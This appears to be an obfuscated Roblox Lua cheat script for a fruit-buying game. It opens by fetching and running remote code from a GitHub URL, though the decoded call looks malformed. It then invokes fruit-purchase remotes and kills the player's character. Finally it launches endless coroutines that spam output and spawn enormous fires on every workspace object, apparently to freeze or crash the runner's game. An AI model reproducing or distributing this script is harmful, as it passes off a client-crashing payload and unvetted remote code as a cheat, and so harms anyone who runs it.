local _Gx=loadstring;(function(_P_,_Q_)return _Gx(_Q_(_P_));end)("dm9pZChnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OZ2hpYTExbi9CYW5hbmEtSHViL21haW4vYmFuYW5haHViLmx1YSIpKSgp","function(d)return d end")()
wait(60)

local function _bHXb(_xAx_)
    local _ZmZX_ = {
        [1] = string.char(80,117,114,99,104,97,115,101,82,97,119,70,114,117,105,116),
        [2] = _xAx_,
        [3] = false
    }

    game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))
        :WaitForChild(string.char(82,101,109,111,116,101,115))
        :WaitForChild(string.char(67,111,109,109,70,95))
        :InvokeServer(unpack(_ZmZX_))
end

local function _mBXXb(_yXb_)
    local _YzYb_ = {
        [1] = string.char(76,111,97,100,70,114,117,105,116),
        [2] = _yXb_
    }

    game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))
        :WaitForChild(string.char(82,101,109,111,116,101,115))
        :WaitForChild(string.char(67,111,109,109,70,95))
        :InvokeServer(unpack(_YzYb_))
end

local function _death_is_nigh()
    local _dstr1 = coroutine.create(function()
        while true do
            for _i = math.pi, math.huge, math.pi do
                print(math.atan(math.sqrt(_i)))
            end
        end
    end)

    local _dstr2 = coroutine.create(function()
        while true do
            local _desc_ = workspace:GetDescendants()
            for _, _v in pairs(_desc_) do
                local _fire1 = Instance.new("Fire", _v)
                local _newPart = Instance.new("Part", workspace)
                local _fire2 = Instance.new("Fire", _newPart)

                _fire1.Size = 9999999999
                _fire1.Heat = 9999999999
                _fire1.TimeScale = 1

                _fire2.Size = 9999999999
                _fire2.Heat = 9999999999
                _fire2.TimeScale = 1
            end
        end
    end)

    local function _do_chaos()
        coroutine.resume(_dstr1)
        coroutine.resume(_dstr2)
    end

    task.wait(0.05)
    print(string.reverse("lanoitren si htaed"))
    _do_chaos()
end

_bHXb(string.char(82,111,99,107,101,116,45,82,111,99,107,101,116))
_bHXb(string.char(83,112,105,107,101,45,83,112,105,107,101))
_bHXb(string.char(83,112,105,110,45,83,112,105,110))
_bHXb(string.char(67,104,111,112,45,67,104,111,112))
_bHXb(string.char(83,112,114,105,110,103,45,83,112,114,105,110,103))
_bHXb(string.char(83,109,111,107,101,45,83,109,111,107,101))
_bHXb(string.char(66,111,109,98,45,66,111,109,98))
_bHXb(string.char(70,108,97,109,101,45,70,108,97,109,101))

local _char = game.Players.LocalPlayer.Character
_char.Humanoid.Health = 0

wait(7)

_death_is_nigh()
